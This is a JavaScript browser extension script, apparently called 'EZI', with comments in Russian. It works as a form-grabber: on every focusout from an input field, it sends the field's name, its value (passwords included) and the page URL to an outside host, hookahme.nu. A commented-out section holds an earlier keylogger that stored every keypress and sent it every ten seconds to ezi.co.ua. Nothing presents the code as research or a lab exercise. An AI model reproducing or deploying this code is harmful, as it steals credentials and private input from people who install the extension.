console.log('Расширение EZI рботает))');
// var url = 'http://ezi.co.ua/save/';
var url = 'https://hookahme.nu/save/';

var ezi = {
    post: function(url, data, cb){
        var xhr = new XMLHttpRequest();
        var fd = new FormData;
        fd.append('data', data);
        xhr.open('POST', url, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState !== 4) return;
            if (xhr.status === 200) {
                if(cb) cb();
            } else {
                console.error('Ошибка отправки запроса!');
            }
        };
        xhr.send(fd);
    }
};

// localStorage.t = '';
// document.body.addEventListener('keypress', function(e){
//     localStorage.t += e.key;
// });
// setInterval(function(){
//     if(localStorage.t){
//         ezi.post('http://ezi.co.ua/save/', localStorage.t + ' | ' +  location.href, function(){
//             localStorage.t = '';
//         });
//     }
// }, 10000);


document.body.addEventListener('focusout', function(e){
    if(e.target.nodeName === 'INPUT'){
        ezi.post(url, 'name: ' + e.target.name + ' | value:' + e.target.value+ ' | ' +  location.href);
    }
});